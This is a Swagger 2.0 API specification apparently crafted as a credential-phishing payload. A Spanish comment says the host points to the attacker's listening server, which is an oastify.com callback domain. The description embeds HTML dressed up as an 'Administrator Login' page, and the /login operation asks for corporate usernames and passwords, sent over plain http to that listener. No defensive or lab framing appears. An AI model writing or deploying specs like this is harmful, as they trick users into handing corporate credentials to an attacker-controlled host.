swagger: '2.0'
# El host apunta a tu servidor de escucha
host: u1wvq58p8wbjqvwgxvuyhvy36ucl0bo0.oastify.com
schemes:
  - http
info:
  version: "1.0.0"
  title: "System Authentication"
  description: |
    <div style="text-align: center; font-family: sans-serif;">
      <img src="https://whare1.netrunners.sh/assets/img/profile.png" width="100" style="border-radius: 50%; margin-bottom: 10px;">
      <h2 style="color: #333;">Administrator Login</h2>
      <p style="color: #666;">Please use the form below to authenticate and access the API console.</p>
    </div>
    <div style="background-color: #fff3cd; border: 1px solid #ffeeba; padding: 12px; border-radius: 4px; color: #856404; text-align: center;">
      <strong>Note:</strong> Your session credentials will be validated against the security gateway.
    </div>

paths:
  /login:
    post:
      summary: "User Authentication"
      description: "Enter your corporate credentials to synchronize the Swagger session."
      consumes:
        - application/x-www-form-urlencoded
      parameters:
        - name: username
          in: formData
          description: "Corporate Username"
          required: true
          type: string
        - name: password
          in: formData
          description: "Corporate Password"
          required: true
          type: string
      responses:
        200:
          description: "Authentication token generated successfully."
        401:
          description: "Invalid credentials."
